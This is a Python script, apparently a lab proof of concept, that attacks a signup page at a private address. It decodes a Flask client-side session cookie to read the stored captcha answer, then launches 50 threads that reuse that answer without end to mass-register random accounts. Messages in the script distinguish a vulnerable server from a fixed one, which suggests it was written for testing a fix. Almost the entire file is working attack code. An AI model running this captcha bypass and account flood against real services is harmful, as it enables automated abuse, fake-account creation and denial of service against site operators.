import requests
import random
import string
import threading
import time
import urllib3
import base64
import json
import sys

# Suppress SSL warnings (since we use self-signed certs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
TARGET_URL = "https://10.10.10.3/signup"
CAPTCHA_URL = "https://10.10.10.3/captcha/image"
HOST_HEADER = "web.sun.dmz" 
THREAD_COUNT = 50 

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def extract_captcha_from_cookie(session_cookie_value):
    """
    Attempts to decode a standard Flask client-side session cookie 
    to extract the 'captcha_result'.
    """
    try:
        # Flask cookies are structure: Payload.Timestamp.Signature
        # We only care about the Payload (first part)
        payload_part = session_cookie_value.split('.')[0]
        
        # Fix Base64 padding (URL-safe base64 strings might miss padding)
        payload_part += '=' * (-len(payload_part) % 4)
        
        # Decode
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        session_data = json.loads(decoded_bytes.decode('utf-8'))
        
        # Look for the answer key. 
        # Note: In your vulnerable description you called it 'captcha_result'.
        return session_data.get("captcha_result") 
    except Exception as e:
        # This is expected if the server is SECURE (Server-side session ID cannot be decoded)
        return None

def attack_worker():
    # 1. Initialize a persistent session
    session = requests.Session()
    session.verify = False
    session.headers.update({"Host": HOST_HEADER})

    # 2. THE BYPASS SETUP (Do this once per thread)
    try:
        # Fetch image to generate the session cookie
        r = session.get(CAPTCHA_URL, timeout=5)
        
        # Grab the cookie string
        cookie_val = session.cookies.get("session")
        if not cookie_val:
            print(f"[-] No session cookie received. Server might be down.")
            return

        # Attempt to exploit Information Disclosure
        captcha_answer = extract_captcha_from_cookie(cookie_val)

        if not captcha_answer:
            print(f"[-] SECURITY CHECK: Could not decode captcha from cookie.")
            print(f"    -> If you are testing the SECURE app, this is GOOD (Fix Verified).")
            print(f"    -> The attacker cannot automate the flood.")
            return

        print(f"[+] BYPASS SUCCESS: Found answer '{captcha_answer}' in cookie. Starting Flood...")

    except Exception as e:
        print(f"[-] Setup failed: {e}")
        return

    # 3. THE FLOOD LOOP (Replay Attack)
    # We reuse the exact same session and answer indefinitely
    while True:
        username = f"user_{generate_random_string(10)}"
        password = "SecurePass123!"

        try:
            # We send the extracted answer. 
            # Because the vulnerable app doesn't invalidate the session, this works forever.
            r = session.post(TARGET_URL, data={
                "username": username,
                "password": password,
                "captcha_answer": captcha_answer 
            }, timeout=5)

            if r.status_code == 302 or "dashboard" in r.text:
                print(f"[+] Account Created: {username} (Reusing Answer: {captcha_answer})", end='\r')
            elif "existiert bereits" in r.text:
                 pass
            else:
                 # If the Secure App is running, this will happen because the session was popped.
                 print(f"[-] Failed (Status {r.status_code}). Session might be invalid.")
                 # Break loop to retry setup (optional, but good for testing)
                 break 
                 
        except Exception as e:
            pass

def start_attack():
    print(f"--- Starting Advanced Verification Flood on {TARGET_URL} ---")
    print(f"--- Threads: {THREAD_COUNT} ---")
    print(f"--- Mode: Client-Side Cookie Decoding & Replay ---")
    
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker)
        t.daemon = True 
        t.start()
        threads.append(t)
    
    # Keep main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    start_attack()